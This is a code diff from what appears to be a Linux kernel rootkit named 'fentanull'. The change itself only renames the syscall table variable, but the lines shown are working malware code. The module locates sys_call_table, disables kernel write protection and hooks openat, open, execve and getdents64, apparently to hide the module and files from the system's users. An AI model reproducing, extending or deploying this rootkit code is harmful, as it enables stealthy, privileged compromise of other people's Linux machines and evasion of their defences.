@@ -46,7 +46,7 @@ struct linux_dirent
 	char		d_name[1];
 };
 
-static unsigned long *sys_call_table; 
+static unsigned long *syscall_table; 
 static pte_t *pte; 
 static struct fentanull_info hidden; 
 static int hook_type; 
@@ -99,13 +99,13 @@ static inline void pte_enable(int mode)
 	{ 
 		case 1: 
 		{ 
-			pte = lookup_address((long unsigned int)sys_call_table, &lvl); 
+			pte = lookup_address((long unsigned int)syscall_table, &lvl); 
 			pte->pte |= _PAGE_RW; 
 			break;
 		}
 		case 0:
 		{ 
-			pte = lookup_address((long unsigned int)sys_call_table, &lvl); 
+			pte = lookup_address((long unsigned int)syscall_table, &lvl); 
 			pte->pte &= ~_PAGE_RW;
 			break;
 		}
@@ -245,16 +245,16 @@ void set_openat(int hook)
 	/* hook == 1: hook function 
 	 * hook == 0: unhook function */
 	unsigned int lvl;
-	pte = lookup_address((long unsigned int)sys_call_table, &lvl); 
+	pte = lookup_address((long unsigned int)syscall_table, &lvl); 
 	if (hook==1)
 	{
 		/* HOOK ITTTTT */
 		#ifdef DEBUG 
 		printk(KERN_ALERT "[-] rk: hooking openat");
 		#endif
-		old_openat = (old_openat_type)sys_call_table[__NR_openat]; 
+		old_openat = (old_openat_type)syscall_table[__NR_openat]; 
 		cr0_unlock();
-		sys_call_table[__NR_openat] = (unsigned long)fentanull_openat;
+		syscall_table[__NR_openat] = (unsigned long)fentanull_openat;
 		cr0_lock(); 
 		#ifdef DEBUG
 		printk(KERN_ALERT "[-] rk: openat located at %p\n", old_openat);
@@ -268,7 +268,7 @@ void set_openat(int hook)
 		printk(KERN_ALERT "[-] rk: unhooking openat\n"); 
 		#endif 
 		cr0_unlock();
-		sys_call_table[__NR_openat] = (unsigned long)old_openat;
+		syscall_table[__NR_openat] = (unsigned long)old_openat;
 		cr0_lock();
 		#ifdef DEBUG
 		printk(KERN_ALERT "[-] rk: openat located at %p\n", old_openat);
@@ -286,9 +286,9 @@ void set_open(int hook)
 		#ifdef DEBUG 
 		printk(KERN_ALERT "[-] rk: hooking open\n"); 
 		#endif 
-		old_open = (old_open_type)sys_call_table[__NR_open]; 
+		old_open = (old_open_type)syscall_table[__NR_open]; 
 		cr0_unlock();
-		sys_call_table[__NR_open] = (unsigned long)fentanull_open;
+		syscall_table[__NR_open] = (unsigned long)fentanull_open;
 		cr0_lock();
 		#ifdef DEBUG
 		printk(KERN_ALERT "[-] rk: open located at %p\n", old_open);
@@ -302,7 +302,7 @@ void set_open(int hook)
 		printk(KERN_ALERT "[-] rk: unhooking open\n"); 
 		#endif 
 		cr0_unlock();
-		sys_call_table[__NR_open] = (unsigned long)old_open;
+		syscall_table[__NR_open] = (unsigned long)old_open;
 		cr0_lock();
 		#ifdef DEBUG
 		printk(KERN_ALERT "[-] rk: open located at %p\n", old_open);
@@ -320,9 +320,9 @@ void set_execve(int hook)
 		#ifdef DEBUG 
 		printk(KERN_ALERT "[-] rk: hooking execve");
 		#endif
-		old_execve = (old_execve_type)sys_call_table[__NR_execve]; 
+		old_execve = (old_execve_type)syscall_table[__NR_execve]; 
 		cr0_unlock();
-		sys_call_table[__NR_execve] = (unsigned long)fentanull_execve;
+		syscall_table[__NR_execve] = (unsigned long)fentanull_execve;
 		cr0_lock();
 		#ifdef DEBUG
 		printk(KERN_ALERT "[-] rk: execve located at %p\n", old_execve);
@@ -336,7 +336,7 @@ void set_execve(int hook)
 		printk(KERN_ALERT "[-] rk: unhooking execve\n"); 
 		#endif 
 		cr0_unlock();
-		sys_call_table[__NR_execve] = (unsigned long)old_execve;
+		syscall_table[__NR_execve] = (unsigned long)old_execve;
 		cr0_lock();
 		#ifdef DEBUG
 		printk(KERN_ALERT "[-] rk: execve located at %p\n", old_execve);
@@ -354,9 +354,9 @@ void set_getdents64(int hook)
 		#ifdef DEBUG 
 		printk(KERN_ALERT "[-] rk: hooking getdents64");
 		#endif
-		old_getdents64 = (old_getdents64_type)sys_call_table[__NR_getdents64]; 
+		old_getdents64 = (old_getdents64_type)syscall_table[__NR_getdents64]; 
 		cr0_unlock(); 
-		sys_call_table[__NR_getdents64] = (unsigned long)fentanull_getdents64;
+		syscall_table[__NR_getdents64] = (unsigned long)fentanull_getdents64;
 		cr0_lock();	
 		#ifdef DEBUG
 		printk(KERN_ALERT "[-] rk: getdents64 located at %p\n", old_getdents64);
@@ -370,7 +370,7 @@ void set_getdents64(int hook)
 		printk(KERN_ALERT "[-] rk: unhooking getdents64\n"); 
 		#endif 
 		cr0_unlock();
-		sys_call_table[__NR_getdents64] = (unsigned long)old_getdents64;
+		syscall_table[__NR_getdents64] = (unsigned long)old_getdents64;
 		cr0_lock();
 		#ifdef DEBUG
 		printk(KERN_ALERT "[-] rk: getdents64 located at %p\n", old_getdents64);
@@ -389,11 +389,11 @@ static int __init fentanull_init(void)
 	hidden.mod = 0; 
 	hidden.files = 0; 
 	owned = 0; 
-	sys_call_table = (void *)kallsyms_lookup_name("sys_call_table"); 
-	if (sys_call_table == NULL)
+	syscall_table = (void *)kallsyms_lookup_name("sys_call_table"); 
+	if (syscall_table == NULL)
 	{ 
 		#ifdef DEBUG
-		printk(KERN_ERR "[!] rk: sys_call_table == NULL.\n"); 
+		printk(KERN_ERR "[!] rk: syscall_table == NULL.\n"); 
 		#endif 
 		return -1; 
 	}
